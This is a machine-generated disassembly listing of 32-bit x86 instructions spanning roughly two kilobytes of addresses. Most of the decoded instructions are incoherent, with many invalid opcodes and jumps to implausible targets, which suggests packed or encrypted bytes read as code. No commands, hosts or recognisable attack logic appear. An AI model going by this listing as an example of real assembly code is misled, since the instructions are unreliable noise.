  41001f:	mov    ebx,0xdf727529
  410024:	frstor [ecx]
  410026:	pop    ebp
  410027:	jmp    0x410093
  410029:	pop    ss
  41002a:	xchg   ebp,eax
  41002b:	and    eax,0x7ec440b2
  410030:	sbb    edx,DWORD PTR [edx-0x7eca099f]
  410036:	inc    edx
  410037:	call   0xfa62:0x3f346f64
  41003e:	idiv   BYTE PTR [esi+0x3b]
  410041:	(bad)  
  410042:	jmp    0x29ef4373
  410047:	(bad)  
  410048:	mov    cl,BYTE PTR [ecx+0x7fa286cd]
  41004e:	shl    DWORD PTR [edx],cl
  410050:	(bad)  
  410052:	loop   0x4100b1
  410054:	adc    al,0xb8
  410056:	mov    ebp,DWORD PTR [edx-0x44ab4acd]
  41005c:	outs   dx,DWORD PTR ds:[esi]
  41005d:	add    DWORD PTR [edi-0x5b00ef53],ebp
  410063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410064:	jbe    0x41006b
  410066:	scas   eax,DWORD PTR es:[edi]
  410067:	rcr    DWORD PTR ds:[edx+0x539533d],0x9a
  41006f:	sbb    BYTE PTR [eax+0x3e],ch
  410072:	(bad)  
  410073:	cmp    eax,0xcdeec328
  410078:	ins    BYTE PTR es:[edi],dx
  410079:	mov    esp,0x87b6b6df
  41007e:	nop
  41007f:	dec    esi
  410080:	es push ds
  410082:	leave  
  410083:	push   esp
  410084:	pushf  
  410085:	sub    al,0x1c
  410087:	repz fsubr DWORD PTR [edx]
  41008a:	sub    eax,0x544591d4
  41008f:	mov    ds:0xb16290cd,eax
  410094:	push   ds
  410095:	cs pop edi
  410097:	cmp    DWORD PTR [ebp+0x4f37d52a],ebx
  41009d:	xor    DWORD PTR [eax+edi*8],edi
  4100a0:	aas    
  4100a1:	mov    eax,DWORD PTR [ebx]
  4100a3:	xchg   ecx,eax
  4100a4:	jg     0x4100aa
  4100a6:	jp     0x410123
  4100a8:	shl    BYTE PTR [eax+0x3aec4aa0],1
  4100ae:	cmc    
  4100af:	xchg   ebx,eax
  4100b0:	jecxz  0x410117
  4100b2:	rol    ebx,0x1e
  4100b5:	add    ebp,esi
  4100b7:	fnsave [ecx*1+0x3a740252]
  4100be:	ins    BYTE PTR es:[edi],dx
  4100bf:	dec    ecx
  4100c0:	jo     0x4100ea
  4100c2:	jg     0x410142
  4100c4:	inc    ebp
  4100c5:	les    edx,FWORD PTR [edx-0x57]
  4100c8:	scas   eax,DWORD PTR es:[edi]
  4100c9:	mov    eax,0xe202fdc4
  4100ce:	clc    
  4100cf:	push   cs
  4100d0:	fcmovnu st,st(7)
  4100d2:	cmp    ebp,DWORD PTR [esp+ebp*2]
  4100d5:	es stc 
  4100d7:	ror    ebp,1
  4100d9:	mov    ebx,0x5428b518
  4100de:	inc    ebx
  4100df:	mov    esi,0xf7c01994
  4100e4:	and    DWORD PTR [edi+0x14e8c34c],ebp
  4100ea:	sbb    esp,ebx
  4100ec:	scas   al,BYTE PTR es:[edi]
  4100ed:	repz mov ch,0xcc
  4100f0:	cdq    
  4100f1:	jg     0x410163
  4100f3:	or     DWORD PTR [ecx+0x6e06660f],eax
  4100f9:	adc    ebp,DWORD PTR [ecx]
  4100fb:	gs scas al,BYTE PTR es:[edi]
  4100fd:	jge    0x41013c
  4100ff:	js     0x410101
  410101:	popa   
  410102:	xchg   ebp,eax
  410103:	adc    al,0x9f
  410105:	or     cl,ch
  410107:	and    al,0xb9
  410109:	sbb    ah,BYTE PTR [edx+eax*8+0x69]
  41010d:	sbb    ah,BYTE PTR [edx]
  41010f:	xor    al,0x5e
  410111:	pushf  
  410112:	imul   ebx,DWORD PTR [esi+ebp*1+0x9],0x3a5ce543
  41011a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41011b:	outs   dx,BYTE PTR ds:[esi]
  41011c:	scas   eax,DWORD PTR es:[edi]
  41011d:	sbb    al,BYTE PTR [ecx]
  41011f:	jmp    0x639e75c8
  410124:	and    BYTE PTR [esi-0x42],ch
  410127:	mov    eax,ds:0x93ceabd0
  41012c:	push   0xefff193c
  410131:	adc    dl,BYTE PTR [eax+0x29]
  410134:	pop    ss
  410135:	leave  
  410136:	loop   0x4101a9
  410138:	ds loope 0x410123
  41013b:	dec    BYTE PTR [esi-0x571847bd]
  410141:	mov    dl,0xcb
  410143:	or     eax,0xb2df48d5
  410148:	addr16 aas 
  41014a:	dec    ebp
  41014b:	sti    
  41014c:	cmp    ah,BYTE PTR [eax+ebx*2+0x3c1e26b8]
  410153:	cmp    DWORD PTR [ecx+esi*1],ebx
  410156:	pop    eax
  410157:	(bad)  [ebp+0x3b]
  41015a:	(bad)  
  41015b:	out    0xb3,al
  41015d:	repz pop ebx
  41015f:	pop    es
  410160:	ins    DWORD PTR es:[edi],dx
  410161:	push   ecx
  410162:	cmp    BYTE PTR [edi+edi*8],cl
  410165:	out    0x68,al
  410167:	inc    ebx
  410168:	jne    0x410196
  41016a:	(bad)  
  41016b:	lea    ebp,[eax+0x1bae7f10]
  410171:	mov    ds:0x8034200,eax
  410176:	sub    edi,edi
  410178:	mov    WORD PTR [edx+eiz*8],gs
  41017b:	xchg   esp,eax
  41017c:	shl    DWORD PTR [edx-0x7e],cl
  41017f:	inc    esi
  410180:	mov    dh,0x2
  410182:	adc    al,0x97
  410184:	push   es
  410185:	sub    ah,bl
  410187:	arpl   bp,sp
  410189:	push   0x179ae301
  41018e:	shl    DWORD PTR [esi+0x64],0xe3
  410192:	or     DWORD PTR [eax-0x7ebe237e],0x77
  410199:	dec    ebp
  41019a:	mov    esp,0x48c209e3
  41019f:	sub    edi,esi
  4101a1:	push   cs
  4101a2:	test   BYTE PTR [ebp-0x48],bh
  4101a5:	xchg   edx,eax
  4101a6:	lock inc edx
  4101a8:	mov    dh,0x2c
  4101aa:	fldcw  WORD PTR [ecx+0x59]
  4101ad:	(bad)
  4101b0:	xor    esi,eax
  4101b2:	sbb    esi,DWORD PTR [edx]
  4101b4:	inc    ebp
  4101b5:	sub    al,0xb4
  4101b7:	and    cl,BYTE PTR [edx-0x35a8544f]
  4101bd:	sub    BYTE PTR [eax],0x4f
  4101c0:	popa   
  4101c1:	fst    st(1)
  4101c3:	sub    eax,0x96da96c1
  4101c8:	adc    edx,DWORD PTR [ebp-0xf92bd04]
  4101ce:	push   edi
  4101cf:	jmp    0x41016a
  4101d1:	outs   dx,BYTE PTR ds:[esi]
  4101d2:	imul   eax,DWORD PTR [esi-0x74],0x494d72f8
  4101d9:	and    DWORD PTR [edx-0x7289d24a],esi
  4101df:	fdiv   QWORD PTR [eax]
  4101e1:	neg    BYTE PTR ds:0x208e69f9
  4101e7:	adc    DWORD PTR [ebx-0x7c3156a],eax
  4101ed:	cmp    esi,edi
  4101ef:	ins    DWORD PTR es:[edi],dx
  4101f0:	mov    bl,0x52
  4101f2:	xor    eax,0xf59a41cc
  4101f7:	sub    cl,BYTE PTR [edx]
  4101f9:	adc    BYTE PTR [edi+0x6f],dl
  4101fc:	subps  xmm1,XMMWORD PTR [ecx]
  4101ff:	push   0xceaa868a
  410204:	iret   
  410205:	sti    
  410206:	in     al,0xde
  410208:	pop    eax
  410209:	lods   al,BYTE PTR ds:[esi]
  41020a:	test   eax,0xe5dc7a17
  41020f:	into   
  410210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410211:	mov    fs,ebx
  410213:	dec    ecx
  410214:	loopne 0x41021c
  410216:	pop    ds
  410217:	fiadd  DWORD PTR [eax+0x1d]
  41021a:	in     al,0xc0
  41021c:	or     eax,0x990788f9
  410221:	popf   
  410222:	stc    
  410223:	shr    BYTE PTR cs:[ecx+0x5d013d2b],0xca
  41022b:	(bad)  
  41022c:	mov    ah,0xca
  41022e:	mov    esp,0xc6da3a2d
  410233:	dec    edx
  410234:	jmp    0x4101dc
  410236:	dec    edi
  410237:	sub    BYTE PTR ds:0x4774ac84,ah
  41023d:	jg     0x4101fd
  41023f:	push   ss
  410240:	jl     0x4101dc
  410242:	fdivr  DWORD PTR [edx]
  410244:	xor    BYTE PTR [ecx],dh
  410246:	test   DWORD PTR [eax+0x26],0x5908c987
  41024d:	fwait
  41024e:	adc    bl,dl
  410250:	mov    DWORD PTR [ebx+0x57cdc9e4],0x9bdf9009
  41025a:	retf   0xac41
  41025d:	adc    dl,BYTE PTR [ebx+ebp*8-0x52]
  410261:	xchg   edi,eax
  410262:	enter  0xc836,0xa7
  410266:	jl     0x4102d3
  410268:	lock jecxz 0x410239
  41026b:	inc    ecx
  41026c:	jecxz  0x410205
  41026e:	outs   dx,DWORD PTR ds:[esi]
  41026f:	inc    ebx
  410270:	xchg   ebp,eax
  410271:	xchg   esp,eax
  410272:	mov    ds,WORD PTR [edx]
  410274:	push   es
  410275:	test   eax,0xb6896534
  41027a:	clc    
  41027b:	popa   
  41027c:	imul   edi,DWORD PTR [ecx],0xffffffee
  41027f:	and    ch,BYTE PTR [eax+0x72]
  410282:	aam    0x29
  410284:	mov    al,ds:0x3acd7bd0
  410289:	stc    
  41028a:	push   ecx
  41028c:	das    
  41028d:	and    bh,dh
  41028f:	inc    eax
  410290:	retf   0xd34f
  410293:	ds es sub al,0xff
  410297:	xchg   ecx,ebp
  410299:	or     cl,bl
  41029b:	pop    edi
  41029c:	add    al,0xdd
  41029e:	push   ebx
  41029f:	popf   
  4102a0:	xchg   edx,eax
  4102a1:	inc    edx
  4102a2:	dec    ebx
  4102a3:	or     ebx,0xffffffa2
  4102a6:	in     al,dx
  4102a7:	xchg   DWORD PTR [eax],eax
  4102a9:	adc    edx,edx
  4102ab:	xchg   esp,eax
  4102ac:	div    BYTE PTR [ebp-0x5c531131]
  4102b2:	fmul   DWORD PTR ds:0xc6c81d9e
  4102b8:	ins    DWORD PTR es:[edi],dx
  4102b9:	daa    
  4102ba:	ins    BYTE PTR es:[edi],dx
  4102bb:	inc    edx
  4102bc:	addr16 icebp 
  4102be:	cmp    al,BYTE PTR [edi+0x6c]
  4102c1:	add    edi,edi
  4102c3:	leave  
  4102c4:	hlt    
  4102c5:	loop   0x4102b5
  4102c7:	test   eax,0x9d07755f
  4102cc:	(bad)  
  4102cd:	shr    DWORD PTR [eax-0x5c],cl
  4102d0:	lods   eax,DWORD PTR ds:[esi]
  4102d1:	push   edx
  4102d2:	out    dx,eax
  4102d3:	das    
  4102d4:	adc    al,0x6
  4102d6:	mov    ds:0x133313ec,eax
  4102db:	dec    ebx
  4102dc:	jae    0x410327
  4102de:	sub    al,0x18
  4102e0:	das    
  4102e1:	cli    
  4102e2:	enter  0x431d,0x2d
  4102e6:	ins    DWORD PTR es:[edi],dx
  4102e7:	ja     0x410342
  4102e9:	and    eax,0x766899ea
  4102ee:	mov    ?,ebp
  4102f0:	stos   DWORD PTR es:[edi],eax
  4102f1:	out    0x21,eax
  4102f3:	push   esi
  4102f4:	mov    al,ds:0xa1d2355c
  4102f9:	gs sbb eax,0x38fcb5c8
  4102ff:	pop    ss
  410300:	into   
  410301:	stc    
  410302:	imul   ebp,DWORD PTR [ecx],0x5425bdc2
  410308:	mov    ebp,0x29154a51
  41030d:	es cs push esi
  410310:	xor    DWORD PTR [ebx-0x1d8a44a],esi
  410316:	mov    esp,0x60c97197
  41031b:	cmc    
  41031c:	mov    eax,DWORD PTR [edi+0x9]
  41031f:	out    0xaf,eax
  410321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410322:	mov    edi,0x7f4d948b
  410327:	leave  
  410328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410329:	push   esi
  41032a:	in     eax,0xa7
  41032c:	inc    ebx
  41032d:	sub    dl,BYTE PTR [esi+0x41e1a41]
  410333:	pusha  
  410334:	jecxz  0x410339
  410336:	mov    dh,0xfc
  410338:	pusha  
  410339:	adc    BYTE PTR [edi-0x6bdd42d7],dh
  41033f:	mov    al,0xe1
  410341:	xor    BYTE PTR [edx+0x56],ah
  410344:	out    dx,al
  410345:	mov    esp,0x1e8c528d
  41034a:	pop    esp
  41034b:	cwde   
  41034c:	repz dec edx
  41034e:	shr    DWORD PTR [ecx+eax*4],1
  410351:	dec    edx
  410352:	iret   
  410353:	(bad)  [eax]
  410355:	(bad)  
  410356:	mov    eax,0x8bd5a600
  41035b:	pop    edx
  41035c:	xor    al,0xb6
  41035e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41035f:	cld    
  410360:	icebp  
  410361:	in     al,dx
  410362:	enter  0x908c,0x9b
  410366:	sub    eax,0x3a99fa1b
  41036b:	ret    0xe392
  41036e:	mov    dh,0xc5
  410370:	mov    esi,edi
  410372:	cmp    dl,BYTE PTR [ecx+edi*2-0x4b]
  410376:	sbb    eax,0xebb425f
  41037b:	mov    ebp,0xbd4f6a6b
  410380:	mov    dl,0x14
  410382:	sti    
  410383:	sahf   
  410384:	pop    ebp
  410385:	xchg   esp,eax
  410386:	fwait
  410387:	ja     0x4103e1
  410389:	dec    ebp
  41038a:	idiv   DWORD PTR [esi+0x57461c68]
  410390:	mov    dl,0xc8
  410392:	xchg   ebx,eax
  410393:	loop   0x4103e4
  410395:	(bad)  [ecx-0x200268bc]
  41039b:	cmp    al,BYTE PTR ds:0xb74fd007
  4103a1:	pop    esp
  4103a2:	push   ebx
  4103a3:	mov    al,ds:0x1d3bc444
  4103a8:	call   0x154d:0x2f8aedb7
  4103af:	add    eax,0x7069e7b3
  4103b4:	xor    al,0xf6
  4103b6:	ret    
  4103b7:	inc    edi
  4103b8:	fcmovbe st,st(0)
  4103ba:	test   DWORD PTR [esi+0x61],edx
  4103bd:	imul   esi,DWORD PTR [edi],0x5b
  4103c0:	jns    0x410391
  4103c2:	and    eax,0xa339fc95
  4103c7:	stos   DWORD PTR es:[edi],eax
  4103c8:	lea    edx,[edi+0x7a1acef6]
  4103ce:	(bad)  
  4103cf:	retf   
  4103d0:	lea    ecx,[eax]
  4103d2:	ret    
  4103d3:	iret   
  4103d4:	dec    BYTE PTR [edx]
  4103d6:	pop    esi
  4103d7:	(bad)  
  4103d8:	fmul   QWORD PTR [esi+0x76]
  4103db:	lea    edx,[edi-0x1c]
  4103de:	cmc    
  4103df:	mov    cl,0x2a
  4103e1:	popf   
  4103e2:	xor    DWORD PTR [edi+0x6e],0x13276eb4
  4103e9:	pushf  
  4103ea:	push   esp
  4103eb:	dec    edx
  4103ec:	scas   al,BYTE PTR es:[edi]
  4103ed:	xlat   BYTE PTR ds:[ebx]
  4103ee:	adc    al,0x98
  4103f0:	pop    esp
  4103f1:	ds (bad) 
  4103f3:	sbb    al,0x97
  4103f5:	addr16 pop esp
  4103f7:	jbe    0x410474
  4103f9:	xchg   edx,eax
  4103fa:	loopne 0x4103a4
  4103fc:	adc    DWORD PTR [ecx-0x71],esi
  4103ff:	fs stos BYTE PTR es:[edi],al
  410401:	inc    eax
  410402:	mov    ah,0xbf
  410404:	(bad)  
  410405:	mov    cl,0x34
  410407:	div    ebx
  410409:	enter  0x6f75,0xe9
  41040d:	mov    ebx,0x5b29002d
  410412:	mov    ecx,0x1d2a1fe9
  410417:	fwait
  410418:	pusha  
  410419:	popa   
  41041a:	ins    DWORD PTR es:[edi],dx
  41041b:	mov    ah,0x27
  41041d:	jbe    0x41046f
  41041f:	out    dx,al
  410420:	inc    edx
  410421:	mov    ds:0x2c15c0ab,eax
  410426:	and    eax,0x2593a7a6
  41042b:	icebp  
  41042c:	ret    
  41042d:	jecxz  0x410462
  41042f:	aam    0xe0
  410431:	repz xor eax,0xb3c17fa5
  410437:	dec    ebp
  410438:	seto   BYTE PTR [esi-0x126f12d]
  41043f:	sub    edi,ebx
  410441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410442:	sbb    al,0x27
  410444:	fisubr DWORD PTR [edx]
  410446:	dec    ebx
  410447:	pusha  
  410448:	or     edi,DWORD PTR es:[ebp+0x49bbe1eb]
  41044f:	adc    BYTE PTR [si],al
  410452:	xor    esi,DWORD PTR [edi+ebx*8-0x6d12b538]
  410459:	dec    ebx
  41045a:	loop   0x410471
  41045c:	fwait
  41045d:	(bad)
  410460:	mov    al,0x1e
  410462:	jnp    0x410413
  410464:	xlat   BYTE PTR ds:[ebx]
  410465:	add    eax,DWORD PTR [esi-0x679e6f15]
  41046b:	outs   dx,BYTE PTR ds:[esi]
  41046c:	ds stc 
  41046e:	out    dx,eax
  41046f:	pushf  
  410470:	repz rol DWORD PTR [esi+0x4397fce6],cl
  410477:	inc    ebx
  410478:	sub    BYTE PTR [ebx+eiz*4-0x49],bh
  41047c:	mov    dh,0x8d
  41047e:	mov    edi,0x930266b1
  410483:	pop    edi
  410484:	xchg   bh,bh
  410486:	imul   ecx,DWORD PTR [ecx-0x3d],0xc88ee66c
  41048d:	(bad)  [edx]
  41048f:	xor    BYTE PTR [esi],bl
  410491:	leave  
  410492:	add    ch,BYTE PTR [esi]
  410494:	repnz retf 0x2145
  410498:	inc    esi
  410499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41049a:	jnp    0x4104cd
  41049c:	ins    DWORD PTR es:[edi],dx
  41049d:	outs   dx,DWORD PTR ds:[esi]
  41049e:	inc    eax
  41049f:	js     0x4104f7
  4104a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104a2:	mov    bl,0x46
  4104a4:	pop    edx
  4104a5:	adc    esi,ebx
  4104a7:	aad    0x92
  4104a9:	ret    0xb0a4
  4104ac:	mov    dh,0x9e
  4104ae:	or     cl,BYTE PTR [ebp-0x2dc9230d]
  4104b4:	mov    cl,BYTE PTR [edx+0x2b]
  4104b7:	es clc 
  4104b9:	xor    eax,0x2b826b93
  4104be:	ja     0x410465
  4104c0:	mov    edi,0x1e96d012
  4104c5:	stc    
  4104c6:	jmp    0x410451
  4104c8:	adc    eax,0x4f9f9d83
  4104cd:	and    al,0x14
  4104cf:	push   edi
  4104d0:	ficom  DWORD PTR [eax-0x2ba48a29]
  4104d6:	bound  ebx,QWORD PTR [edi-0x59eb818c]
  4104dc:	ss sbb bl,bh
  4104df:	push   eax
  4104e0:	ror    BYTE PTR [edx+0x1],0x44
  4104e4:	scas   eax,DWORD PTR es:[edi]
  4104e5:	fistp  DWORD PTR [ebp+0x62680d88]
  4104eb:	cld    
  4104ec:	pop    edi
  4104ed:	pushf  
  4104ee:	sub    DWORD PTR [edx+eax*2],edx
  4104f1:	cmc    
  4104f2:	lds    esi,FWORD PTR [ecx]
  4104f4:	xchg   esi,eax
  4104f5:	or     esp,DWORD PTR [edx+0x49013ee6]
  4104fb:	xchg   ecx,eax
  4104fc:	imul   esp,DWORD PTR [esi-0x5b],0x88b613ec
  410503:	sbb    bh,BYTE PTR [esi+0x5a6691e]
  410509:	jle    0x410523
  41050b:	out    dx,al
  41050c:	dec    esp
  41050d:	and    al,0x63
  41050f:	sub    al,0xe
  410511:	mov    dl,0x37
  410513:	mov    DWORD PTR [eax],ecx
  410515:	mov    al,0x77
  410517:	xor    DWORD PTR [eax-0x5a],ebp
  41051a:	mov    eax,0x9532b8b6
  41051f:	xchg   edx,eax
  410520:	(bad)  
  410521:	out    dx,eax
  410522:	(bad)  
  410523:	rcl    ebx,cl
  410525:	(bad)  
  410526:	pop    ss
  410527:	sub    BYTE PTR [ebx+0x31cb917a],0xa8
  41052e:	sbb    DWORD PTR [ecx+0x35],0x493d5b45
  410535:	mov    ebp,ebp
  410537:	outs   dx,BYTE PTR ds:[esi]
  410538:	sbb    al,0x4d
  41053a:	and    eax,0x75ebcae3
  41053f:	add    al,0xbd
  410541:	pop    edx
  410542:	mov    al,0x64
  410544:	sbb    ah,0x8b
  410547:	add    al,0x8d
  410549:	test   al,0xa8
  41054b:	ror    edx,1
  41054d:	scas   al,BYTE PTR es:[edi]
  41054e:	scas   al,BYTE PTR es:[edi]
  41054f:	lahf   
  410550:	and    ecx,edi
  410552:	mov    BYTE PTR [ebx],cl
  410554:	cwde   
  410555:	add    esp,DWORD PTR [ebp+0x3530be92]
  41055b:	dec    esp
  41055c:	lea    ebx,[esi-0x49f8b586]
  410562:	pusha  
  410563:	mov    esp,0x22291e2c
  410568:	xor    al,BYTE PTR ds:[ebx-0x61]
  41056c:	or     ebp,0x9b0eebed
  410572:	pop    esi
  410573:	imul   cx,WORD PTR fs:[edx-0x6fed1442],0x342d
  41057d:	inc    edi
  41057e:	es scas eax,DWORD PTR es:[edi]
  410580:	push   ss
  410581:	xchg   edi,eax
  410582:	mov    eax,0x4e12297a
  410587:	retf   0x721c
  41058a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41058b:	jmp    0x410603
  41058d:	push   ecx
  41058e:	shl    bp,0xc2
  410592:	bound  esp,QWORD PTR [edi+0x4f]
  410595:	adc    edx,DWORD PTR [ebx+0x25]
  410598:	mov    esp,0xcc779651
  41059d:	add    edi,DWORD PTR [ebx]
  41059f:	lods   al,BYTE PTR ds:[esi]
  4105a0:	mov    dl,0x9d
  4105a2:	das    
  4105a3:	rol    BYTE PTR [eax+0x3f],1
  4105a6:	pop    es
  4105a7:	jge    0x410583
  4105a9:	imul   edx,edx,0x5bc919f1
  4105af:	arpl   WORD PTR [ecx-0x3acba6ae],cx
  4105b5:	cwde   
  4105b6:	rcl    ebx,cl
  4105b8:	mov    eax,fs:0x2c790e42
  4105be:	mov    esi,DWORD PTR [ecx+0x2948a150]
  4105c4:	imul   eax,ebp,0x4b
  4105c7:	sub    bh,BYTE PTR [edx]
  4105c9:	mov    ebx,0x3c9ac248
  4105ce:	adc    esi,DWORD PTR [ecx]
  4105d0:	adc    edi,DWORD PTR [ebx]
  4105d2:	ins    BYTE PTR es:[edi],dx
  4105d3:	(bad)  
  4105d4:	out    0x4d,eax
  4105d6:	mov    DWORD PTR [edi+0x2b9aa821],edi
  4105dc:	retf   
  4105dd:	pushf  
  4105de:	sbb    DWORD PTR [edi],edx
  4105e0:	or     BYTE PTR [eax+0x53],dh
  4105e3:	mov    edx,0xf3f3d93b
  4105e8:	cmp    DWORD PTR [esi],ebx
  4105ea:	xor    al,0x19
  4105ec:	or     cl,BYTE PTR [edx+0x67]
  4105ef:	pushf  
  4105f0:	sub    dl,BYTE PTR [edi+0x69ead69e]
  4105f6:	loope  0x410638
  4105f8:	shrd   esp,edx,cl
  4105fb:	jae    0x4105e7
  4105fd:	(bad)  
  4105fe:	push   es
  4105ff:	in     al,0x88
  410601:	ins    DWORD PTR es:[edi],dx
  410602:	repnz loope 0x41062e
  410605:	loopne 0x41062c
  410607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410608:	pop    esi
  410609:	sub    eax,0xcd8845fe
  41060e:	cmp    dl,ah
  410610:	mov    bl,0x46
  410612:	mov    al,0xd7
  410614:	pop    edx
  410615:	fwait
  410616:	(bad)  
  410617:	pop    edi
  410618:	inc    ecx
  410619:	jns    0x4105bf
  41061b:	mov    ds,WORD PTR [ebx]
  41061d:	mov    eax,0x406ca52c
  410623:	cdq    
  410624:	adc    edx,DWORD PTR [esp+edi*2+0x68]
  410628:	out    0xa,al
  41062a:	mov    dl,0xcc
  41062c:	push   ss
  41062d:	sub    DWORD PTR [esi+0x66],0x9d6bc1e6
  410634:	ror    DWORD PTR [eax-0x18],1
  410637:	fadd   st,st(0)
  410639:	xchg   esp,eax
  41063a:	out    0xbd,eax
  41063c:	sbb    al,0x5d
  41063e:	test   al,0x7
  410640:	fcmovnu st,st(0)
  410642:	hlt    
  410643:	imul   esi,DWORD PTR [ebp+0x4c3d4416],0x9112a514
  41064d:	imul   ecx,DWORD PTR [esi],0x8f561c55
  410653:	std    
  410654:	inc    ecx
  410655:	cmp    eax,0x46dab050
  41065a:	inc    DWORD PTR [ebp-0x6f]
  41065d:	cmp    esi,esp
  41065f:	daa    
  410660:	fs ret 0xead4
  410664:	push   edi
  410665:	jecxz  0x41062c
  410667:	mov    ch,0x77
  410669:	inc    edx
  41066a:	and    ch,bl
  41066c:	jp     0x41069d
  41066e:	push   cs
  41066f:	xchg   edi,eax
  410670:	mov    fs,WORD PTR [ecx]
  410672:	mov    ss,WORD PTR [eax+0x7f67a33b]
  410678:	int3   
  410679:	add    esi,DWORD PTR [eax]
  41067b:	aad    0x14
  41067d:	imul   edi,DWORD PTR [eax-0x399975d5],0xd154eb5a
  410687:	and    DWORD PTR ds:0x782ab974,eax
  41068d:	or     edx,DWORD PTR [eax-0x48]
  410690:	jmp    0x69057d7d
  410695:	push   esp
  410696:	retf   0x5f2b
  410699:	retf   
  41069a:	arpl   dx,cx
  41069c:	ret    0x1bc9
  41069f:	lea    ecx,[eax-0x57]
  4106a2:	test   BYTE PTR ds:0xfef77e6f,ah
  4106a8:	ss jmp 0x410635
  4106ab:	test   DWORD PTR [ecx],esi
  4106ad:	fld    DWORD PTR [ecx+0x13fa6005]
  4106b3:	jbe    0x410649
  4106b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106b6:	sbb    ah,bh
  4106b8:	test   bh,al
  4106ba:	xchg   ebx,eax
  4106bb:	xchg   edi,eax
  4106bc:	gs push ecx
  4106be:	pop    ebx
  4106bf:	outs   dx,BYTE PTR ds:[esi]
  4106c0:	aam    0x6f
  4106c2:	xor    ah,al
  4106c4:	and    al,0xd1
  4106c6:	test   BYTE PTR [eax-0x6b868a04],bh
  4106cc:	retf   
  4106cd:	stos   BYTE PTR es:[edi],al
  4106ce:	pop    es
  4106cf:	ror    DWORD PTR [ebx+0x55808d38],0x9c
  4106d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106d7:	icebp  
  4106d8:	push   edi
  4106d9:	bound  eax,QWORD PTR [ebx]
  4106db:	loope  0x4106c6
  4106dd:	or     eax,0x2861a3dc
  4106e2:	dec    ebx
  4106e3:	or     ch,BYTE PTR [eax+0x2e]
  4106e6:	xor    edi,ecx
  4106e8:	and    DWORD PTR [ebx+eax*2],edx
  4106eb:	inc    edx
  4106ec:	(bad)  
  4106ed:	jno    0x410759
  4106ef:	push   esi
  4106f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106f1:	mov    eax,0x92309c
	...
  41073e:	add    BYTE PTR [ebx+0x1b],bh
  410741:	adc    BYTE PTR [eax],al
  410743:	lods   al,BYTE PTR ds:[esi]
  410744:	push   ebp
  410745:	adc    BYTE PTR [eax],al
  410747:	punpcklwd mm2,DWORD PTR [eax]
  41074a:	add    BYTE PTR [edi+0x6300100d],ch
  410750:	adc    BYTE PTR gs:[eax],al
  410753:	shl    BYTE PTR [edi],0x10
  410756:	add    BYTE PTR [ecx+0x7300101d],dh
  41075c:	js     0x41076e
  41075e:	add    BYTE PTR [ebp+0x38],al
  410761:	xor    eax,0x565f3235
  410766:	aaa    
  410767:	add    BYTE PTR [eax+0x30],dl
  41076a:	push   esp
  41076b:	pop    edi
  41076c:	inc    edi
  41076d:	dec    ebp
  41076e:	xor    bl,BYTE PTR [edx+0x5f]
  410771:	inc    esp
  410772:	ss xor BYTE PTR ss:0x4f494c00,dh
  41077a:	xor    BYTE PTR [edi],dh
  41077c:	pop    edi
  41077d:	dec    edx
  41077e:	inc    ecx
  41077f:	add    BYTE PTR [ecx+0x47],bl
  410782:	pop    edx
  410783:	xor    eax,0x4442595f
  410788:	dec    esi
  410789:	inc    ebx
  41078a:	pop    edi
  41078b:	xor    eax,0x334a0048
  410790:	push   ecx
  410791:	pop    edi
  410792:	xor    al,BYTE PTR [esi+0x35]
  410795:	push   eax
  410796:	cmp    DWORD PTR [eax],edi
  410798:	add    BYTE PTR [ebp+0x32],dl
  41079b:	push   edi
  41079c:	xor    BYTE PTR [edi+0x42],bl
  41079f:	dec    eax
  4107a0:	inc    ebp
  4107a1:	pop    edi
  4107a2:	xor    ebx,DWORD PTR [eax+0x46]
  4107a5:	dec    ebx
  4107a6:	inc    esp
  4107a7:	aaa    
  4107a8:	add    BYTE PTR [edi+0x46],cl
  4107ab:	push   esi
  4107ac:	xor    al,0x34
  4107ae:	pop    edi
  4107af:	inc    edi
  4107b0:	inc    edi
  4107b1:	push   esp
  4107b2:	pop    edx
  4107b3:	inc    edx
  4107b4:	pop    edi
  4107b5:	push   ebp
  4107b6:	add    BYTE PTR [edi+0x41],al
  4107b9:	xor    al,0x39
  4107bb:	xor    BYTE PTR [edi+0x39],bl
  4107be:	inc    edx
  4107bf:	add    BYTE PTR [esi+0x36],cl
  4107c2:	xor    bl,BYTE PTR [edi+0x41]
  4107c5:	xor    ebx,DWORD PTR ss:[edi+0x38]
  4107c9:	xor    eax,DWORD PTR [ecx+0x52]
  4107cc:	push   ebx
  4107cd:	pop    edi
  4107ce:	inc    esi
  4107cf:	add    BYTE PTR [ecx+0x57],al
  4107d2:	push   ebp
  4107d3:	pop    edi
  4107d4:	inc    esi
  4107d5:	pop    edx
  4107d6:	push   ebp
  4107d7:	xor    dh,BYTE PTR [esi]
  4107d9:	add    BYTE PTR [edi+0x48],al
  4107dc:	xor    BYTE PTR [edi+0x33],bl
  4107df:	inc    ebp
  4107e0:	cmp    DWORD PTR [edi+0x5f],ecx
  4107e3:	push   ebx
  4107e4:	cmp    DWORD PTR [eax],eax
  4107e6:	push   esp
  4107e7:	xor    al,0x51
  4107e9:	cmp    BYTE PTR [esi],dh
  4107eb:	pop    edi
  4107ec:	push   esp
  4107ed:	dec    ecx
  4107ee:	dec    edi
  4107ef:	add    BYTE PTR [esp+ecx*2+0x5a],al
  4107f3:	pop    edi
  4107f4:	pop    edx
  4107f5:	dec    edx
  4107f6:	cmp    BYTE PTR [ebx+eax*2+0x5f],dl
  4107fa:	cmp    DWORD PTR [ecx],edi
  4107fc:	add    BYTE PTR [eax+0x4e],dl
  4107ff:	xor    al,0x5f
  410801:	dec    esi
  410802:	inc    esp
  410803:	xor    DWORD PTR [edi],esi
  410805:	pop    edi
